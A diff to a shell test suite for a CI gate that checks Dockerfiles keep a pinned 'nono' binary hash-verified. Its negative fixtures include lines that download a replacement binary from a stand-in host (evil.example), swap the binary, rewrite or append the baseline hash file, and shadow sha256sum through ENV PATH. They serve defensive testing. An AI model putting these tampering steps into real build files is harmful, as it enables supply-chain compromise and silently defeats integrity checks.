@@ -59,7 +59,7 @@ COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
 RUN groupadd -r tps && useradd -r -g tps -m -s /bin/bash tps
 COPY docker/tps-office-supervisor.sh /usr/local/bin/tps-office-supervisor
 ENTRYPOINT ["tps-office-supervisor"]
-RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 }
 
@@ -230,7 +230,7 @@ RUN set -eux; \
 FROM node:24-bookworm-slim@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
 COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
-RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 run_case "digest-pinned-control" pass "$d"
 
@@ -284,7 +284,7 @@ FROM node:24-bookworm-slim AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
 COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
 RUN --mount=type=bind,from=nono-builder,target=/m true
-RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 } >"$d/docker/Dockerfile"
 run_case "run-mount-pinned-control" pass "$d"
@@ -310,7 +310,7 @@ FROM node:24-bookworm-slim AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
 COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
 RUN mv /tmp/x /usr/local//bin/nono
-RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 } >"$d/docker/Dockerfile"
 run_case "slash-path-write" fail "$d"
@@ -322,7 +322,7 @@ FROM node:24-bookworm-slim AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
 COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
 RUN mv /tmp/x /usr/local/bin/./nono
-RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 } >"$d/docker/Dockerfile"
 run_case "dotslash-path-write" fail "$d"
@@ -334,7 +334,7 @@ FROM node:24-bookworm-slim AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
 COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
 RUN ln -sf /tmp/x /usr/local/bin/"nono"
-RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 } >"$d/docker/Dockerfile"
 run_case "quoted-path-write" fail "$d"
@@ -346,7 +346,7 @@ FROM node:24-bookworm-slim AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
 COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
 RUN ln -sf /tmp/x /usr/local/bin/"non"o
-RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 } >"$d/docker/Dockerfile"
 run_case "split-quote-path-write" fail "$d"
@@ -360,7 +360,7 @@ FROM node:24-bookworm-slim AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
 COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
 RUN node -e 'require("https").get("https://evil.example/p",r=>r.pipe(require("fs").createWriteStream("/usr/local/bin/nono")))'
-RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 } >"$d/docker/Dockerfile"
 run_case "node-fetcher-path-write" fail "$d"
@@ -371,6 +371,54 @@ run_case "node-fetcher-path-write" fail "$d"
 d="$(mk sha256-assertion-control)"; good_pin "$d"
 { good_stage; good_base; } >"$d/docker/Dockerfile"
 run_case "sha256-assertion-control" pass "$d"
+
+# ── 26. Hash-recompute defeat (r7 Kern): a RUN rewrites the baseline hash file so
+# the assertion compares evil-today to evil-today. The variable-directory `mv`
+# hides from rule 8's path whitelist; the hash rewrite is what rule 8a refuses.
+# This shape passed the gate (exit 0) at head, before the clause.
+d="$(mk hash-recompute-defeat)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN node -e 'require("https").get("https://evil.example/payload",r=>r.pipe(require("fs").createWriteStream("/tmp/evil")))'
+RUN d=/usr/local/bin; mv /tmp/evil $d/nono; /usr/bin/sha256sum $d/nono | /usr/bin/cut -d' ' -f1 > /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+EOF
+} >"$d/docker/Dockerfile"
+run_case "hash-recompute-defeat" fail "$d"
+
+# ── 27. Append-to-the-hash-file variant: the tampered binary's hash is appended
+# to the baseline so the recorded value can be made to agree with the shipped
+# bytes. Any instruction naming the hash file other than the pinned COPY and the
+# final assertion is refused (rule 8a).
+d="$(mk hash-append-defeat)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN d=/usr/local/bin; printf 'evil\n' > /tmp/evil; mv /tmp/evil $d/nono
+RUN d=/usr/local/bin; /usr/bin/sha256sum $d/nono | /usr/bin/cut -d' ' -f1 >> /tmp/nono.sha256
+RUN test "$(/usr/bin/sha256sum /usr/local/bin/nono | /usr/bin/cut -d' ' -f1)" = "$(/bin/cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+EOF
+} >"$d/docker/Dockerfile"
+run_case "hash-append-defeat" fail "$d"
+
+# ── 28. ENV PATH shadow of the assertion's tools (r7 Kern): a shim named
+# `sha256sum` (whose body names the baseline file) is placed ahead of the real
+# one. Refused three ways: ENV PATH in base (rule 8b), the shim instruction naming
+# nono.sha256 (rule 8a), and the bare-tool final instruction (rule 8b).
+d="$(mk path-shadow-sha256sum)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+ENV PATH=/shim:$PATH
+RUN mkdir -p /shim && printf '#!/bin/sh\n/bin/cat /tmp/nono.sha256\n' > /shim/sha256sum && chmod +x /shim/sha256sum
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+EOF
+} >"$d/docker/Dockerfile"
+run_case "path-shadow-sha256sum" fail "$d"
 
 # ── Regression guard: the CI workflow must still invoke the gate ─────────────
 if grep -qF './scripts/check-nono-pin.sh' "$repo_root/.github/workflows/test.yml"; then
